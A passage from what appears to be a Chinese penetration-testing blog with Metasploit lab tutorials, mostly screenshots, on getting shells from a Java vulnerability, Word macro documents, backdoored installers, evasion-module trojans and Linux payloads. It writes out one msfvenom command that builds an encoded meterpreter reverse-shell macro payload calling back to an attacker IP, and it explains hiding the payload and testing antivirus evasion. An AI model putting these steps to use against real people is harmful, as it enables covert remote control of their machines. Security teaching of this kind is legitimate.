<h2 id="三、基于java环境的漏洞获取shell"><a href="#三、基于java环境的漏洞获取shell" class="headerlink" title="三、基于java环境的漏洞获取shell"></a>三、基于java环境的漏洞获取shell</h2><p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101510091.png" alt="image-20210818101510091"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101548466.png" alt="image-20210818101548466"></p>
<p>说明：该漏洞与jre的版本有关，其他版本可能不行</p>
<p>步骤1：加载模块</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101727843.png" alt="image-20210818101727843"></p>
<p>步骤2：配置payload并启动</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101835440.png" alt="image-20210818101835440"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101854499.png" alt="image-20210818101854499"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101932255.png" alt="image-20210818101932255"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102202346.png" alt="image-20210818102202346"></p>
<p>补充：需要打开apache2服务</p>
<p>步骤3：可能会弹出的提示框操作与结果展示</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102503192.png" alt="image-20210818102503192"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102538395.png" alt="image-20210818102538395"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102625422.png" alt="image-20210818102625422"></p>
<p>结果（会话可能后台运行了）</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102811873.png" alt="image-20210818102811873"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102839600.png" alt="image-20210818102839600"></p>
<h2 id="四、利用宏感染word文档获取shell"><a href="#四、利用宏感染word文档获取shell" class="headerlink" title="四、利用宏感染word文档获取shell"></a>四、利用宏感染word文档获取shell</h2><p>步骤1：生成宏恶意文件</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818103109953.png" alt="image-20210818103109953"></p>
<p>指令：msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104623212.png" alt="image-20210818104623212"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104647745.png" alt="image-20210818104647745"></p>
<p>将上面这段代码放到word里的宏。</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104807569.png" alt="image-20210818104807569"></p>
<p>payload放到文件内容（将其隐藏）</p>
<p>如图操作</p>
<p>宏设置：</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105017122.png" alt="image-20210818105017122"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105121898.png" alt="image-20210818105121898"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105236492.png" alt="image-20210818105236492"></p>
<p>payload操作：</p>
<p>将kali生成的payload代码放入刚保存的带宏的文件中</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105437540.png" alt="image-20210818105437540"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105600439.png" alt="image-20210818105600439"></p>
<p>隐藏效果</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105613376.png" alt="image-20210818105613376"></p>
<p>再在前面输入正常内容</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105658221.png" alt="image-20210818105658221"></p>
<p>步骤2：监听</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105902905.png" alt="image-20210818105902905"></p>
<p>LHOST是指监听者的ip地址</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105925383.png" alt="image-20210818105925383"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105957052.png" alt="image-20210818105957052"></p>
<p>步骤3：效果</p>
<p>目标机打开文件</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818110059162.png" alt="image-20210818110059162"></p>
<p>攻击者</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818110159404.png" alt="image-20210818110159404"></p>
<p>补充：该文件如果发到其他主机，其他主机也可能会被感染/遭受攻击</p>
<p><strong>应对方法</strong>：安装杀毒软件，杀毒软件会发出警告或杀掉木马。也可以查看宏来判断</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">客户端渗透</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-17 10:38:12 / 修改时间：10:38:54" itemprop="dateCreated datePublished" datetime="2021-08-17T10:38:12+08:00">2021-08-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="客户端渗透"><a href="#客户端渗透" class="headerlink" title="客户端渗透"></a>客户端渗透</h1><h2 id="一、客户端渗透原理"><a href="#一、客户端渗透原理" class="headerlink" title="一、客户端渗透原理"></a>一、客户端渗透原理</h2><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201142972.png" alt="image-20210816201142972"></p>
<h2 id="二、制作Windows恶意软件获取shell"><a href="#二、制作Windows恶意软件获取shell" class="headerlink" title="二、制作Windows恶意软件获取shell"></a>二、制作Windows恶意软件获取shell</h2><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201337098.png" alt="image-20210816201337098"></p>
<h3 id="实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马"><a href="#实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马" class="headerlink" title="实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马"></a>实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201528885.png" alt="image-20210816201528885"></p>
<h3 id="2-1生成西瓜影音-exe后门程序"><a href="#2-1生成西瓜影音-exe后门程序" class="headerlink" title="2.1生成西瓜影音.exe后门程序"></a>2.1生成西瓜影音.exe后门程序</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201708965.png" alt="image-20210816201708965"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201745558.png" alt="image-20210816201745558"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201820472.png" alt="image-20210816201820472"></p>
<p>环境：kali、win7（靶机）</p>
<h4 id="步骤1：生成后门程序并启动服务器"><a href="#步骤1：生成后门程序并启动服务器" class="headerlink" title="步骤1：生成后门程序并启动服务器"></a>步骤1：生成后门程序并启动服务器</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201959791.png" alt="image-20210816201959791"></p>
<h4 id="步骤2：在MSF上启动handler开始监听后门程序"><a href="#步骤2：在MSF上启动handler开始监听后门程序" class="headerlink" title="步骤2：在MSF上启动handler开始监听后门程序"></a>步骤2：在MSF上启动handler开始监听后门程序</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203201351.png" alt="image-20210816203201351"></p>
<p>启动msf</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203308925.png" alt="image-20210816203308925"></p>
<p>加载hander模块</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203337202.png" alt="image-20210816203337202"></p>
<p>配置payload</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203450238.png" alt="image-20210816203450238"></p>
<p>查看并配置参数、启动</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203609271.png" alt="image-20210816203609271"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203656900.png" alt="image-20210816203656900"></p>
<p>补充：启动后就在监听了</p>
<h4 id="步骤3：win7下载木马文件并运行"><a href="#步骤3：win7下载木马文件并运行" class="headerlink" title="步骤3：win7下载木马文件并运行"></a>步骤3：win7下载木马文件并运行</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202231441.png" alt="image-20210816202231441"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202251261.png" alt="image-20210816202251261"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203759663.png" alt="image-20210816203759663"></p>
<h4 id="步骤4：查看结果并提升权限"><a href="#步骤4：查看结果并提升权限" class="headerlink" title="步骤4：查看结果并提升权限"></a>步骤4：查看结果并提升权限</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203911048.png" alt="image-20210816203911048"></h4><p>查看权限</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204025799.png" alt="image-20210816204025799"></p>
<p>提升权限</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204236941.png" alt="image-20210816204236941"></p>
<p>其他操作</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204419164.png" alt="image-20210816204419164"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204435891.png" alt="image-20210816204435891"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204609219.png" alt="image-20210816204609219"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204637881.png" alt="image-20210816204637881"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204731011.png" alt="image-20210816204731011"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204847203.png" alt="image-20210816204847203"></p>
<p>补充：软件病毒/木马等扫描网站</p>
<p>1.可以把程序/软件会被那些杀毒软件扫描出来</p>
<p>2.可以检测自己制作的木马可以避开率</p>
<p>扫描网站1：<a target="_blank" rel="noopener" href="https://www.virscan.org/">https://www.virscan.org/</a></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202542969.png" alt="image-20210816202542969"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202732647.png" alt="image-20210816202732647"></p>
<p>扫描网站2：<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202846223.png" alt="image-20210816202846223"></p>
<h3 id="2-2模拟黑客给真正的软件加上后门"><a href="#2-2模拟黑客给真正的软件加上后门" class="headerlink" title="2.2模拟黑客给真正的软件加上后门"></a>2.2模拟黑客给真正的软件加上后门</h3><h4 id="步骤1：下载正版软件并安装上后门"><a href="#步骤1：下载正版软件并安装上后门" class="headerlink" title="步骤1：下载正版软件并安装上后门"></a>步骤1：下载正版软件并安装上后门</h4><p>下载程序</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205146217.png" alt="image-20210816205146217"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205214862.png" alt="image-20210816205214862"></p>
<p>查找要安装后门的程序（副程序：主程序启动会带动其启动）</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205633896.png" alt="image-20210816205633896"></p>
<h4 id="步骤2：把副程序复制到kali进行安装后门"><a href="#步骤2：把副程序复制到kali进行安装后门" class="headerlink" title="步骤2：把副程序复制到kali进行安装后门"></a>步骤2：把副程序复制到kali进行安装后门</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205914655.png" alt="image-20210816205914655"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205939315.png" alt="image-20210816205939315"></p>
<p>安装后门</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210009776.png" alt="image-20210816210009776"></p>
<p>win7下载安装了后门的程序并替换正版的程序</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210157882.png" alt="image-20210816210157882"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210214266.png" alt="image-20210816210214266"></p>
<p>步骤3：启动</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210303111.png" alt="image-20210816210303111"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210315008.png" alt="image-20210816210315008"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210349331.png" alt="image-20210816210349331"></p>
<p>回到win7启动软件</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210438619.png" alt="image-20210816210438619"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210512609.png" alt="image-20210816210512609"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210616482.png" alt="image-20210816210616482"></p>
<h3 id="2-3-使用metasploit的evasion模块生成后门木马"><a href="#2-3-使用metasploit的evasion模块生成后门木马" class="headerlink" title="2.3 使用metasploit的evasion模块生成后门木马"></a>2.3 使用metasploit的evasion模块生成后门木马</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210719911.png" alt="image-20210816210719911"></p>
<h4 id="步骤1：查找并加载模块"><a href="#步骤1：查找并加载模块" class="headerlink" title="步骤1：查找并加载模块"></a>步骤1：查找并加载模块</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210803467.png" alt="image-20210816210803467"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210832486.png" alt="image-20210816210832486"></p>
<h4 id="步骤2：修改木马文件名称（可以不修改）"><a href="#步骤2：修改木马文件名称（可以不修改）" class="headerlink" title="步骤2：修改木马文件名称（可以不修改）"></a>步骤2：修改木马文件名称（可以不修改）</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210936108.png" alt="image-20210816210936108"></p>
<h4 id="步骤3：设置payload"><a href="#步骤3：设置payload" class="headerlink" title="步骤3：设置payload"></a>步骤3：设置payload</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211013243.png" alt="image-20210816211013243"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211051718.png" alt="image-20210816211051718"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211129141.png" alt="image-20210816211129141"></p>
<p>启动生成文件</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211209466.png" alt="image-20210816211209466"></p>
<p>补充：上传文件，方便win7下载（也可以直接复制）</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211330054.png" alt="image-20210816211330054"></p>
<h4 id="步骤4：监听"><a href="#步骤4：监听" class="headerlink" title="步骤4：监听"></a>步骤4：监听</h4><p>渗透：加载模块、配置参数</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211521609.png" alt="image-20210816211521609"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211559689.png" alt="image-20210816211559689"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211611575.png" alt="image-20210816211611575"></p>
<h4 id="步骤5：win7启动木马文件"><a href="#步骤5：win7启动木马文件" class="headerlink" title="步骤5：win7启动木马文件"></a>步骤5：win7启动木马文件</h4><p>下载文件</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211648937.png" alt="image-20210816211648937"></p>
<p>启动木马文件</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211730407.png" alt="image-20210816211730407"></p>
<p>kali查看结果</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211810550.png" alt="image-20210816211810550"></p>
<h2 id="三、制作Linux恶意软件获取shell"><a href="#三、制作Linux恶意软件获取shell" class="headerlink" title="三、制作Linux恶意软件获取shell"></a>三、制作Linux恶意软件获取shell</h2><p><strong>步骤1：使用msfvenom生成linux可执行文件，再开启apache服务</strong></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817102634654.png" alt="image-20210817102634654"></p>
<p>补充：这里的恶意文件是放在根目录下的，所以linux下载直接是ip地址+</p>
<p><strong>步骤2：linux系统下载恶意文件</strong></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817102923861.png" alt="image-20210817102923861"></p>
<p>此时文件是不可执行的，所以要提升权限</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103147429.png" alt="image-20210817103147429"></p>
<p>步骤3：设置linux的payload并</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103256476.png" alt="image-20210817103256476"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103309884.png" alt="image-20210817103309884"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103341812.png" alt="image-20210817103341812"></p>
<p>步骤4：linux启动程序</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103420606.png" alt="image-20210817103420606"></p>
<p>步骤5：查看结果与操作</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103501914.png" alt="image-20210817103501914"></p>
<p>查看当前目录</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103601631.png" alt="image-20210817103601631"></p>
<p>查看身份权限</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103644708.png" alt="image-20210817103644708"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">Metasploit渗透测试之信息收集</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-16 15:31:50 / 修改时间：15:32:29" itemprop="dateCreated datePublished" datetime="2021-08-16T15:31:50+08:00">2021-08-16</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Metasploit渗透测试之信息收集"><a href="#Metasploit渗透测试之信息收集" class="headerlink" title="Metasploit渗透测试之信息收集"></a>Metasploit渗透测试之信息收集</h1><h2 id="一、基于TCP协议收集主机信息"><a href="#一、基于TCP协议收集主机信息" class="headerlink" title="一、基于TCP协议收集主机信息"></a>一、基于TCP协议收集主机信息</h2><h4 id="1-1使用Metasploit中的nmap和arp-sweep收集主机信息"><a href="#1-1使用Metasploit中的nmap和arp-sweep收集主机信息" class="headerlink" title="1.1使用Metasploit中的nmap和arp_sweep收集主机信息"></a>1.1使用Metasploit中的nmap和arp_sweep收集主机信息</h4><p>步骤1：扫描网关/主机，查看端口开放信息</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815102105986.png" alt="image-20210815102105986"></p>
<p>步骤2：查看arp_sweep的模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815102341061.png" alt="image-20210815102341061"></p>
<p>步骤3：加载模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815102415059.png" alt="image-20210815102415059"></p>
<p>步骤4：查看模块信息并配置/修改的参数</p>
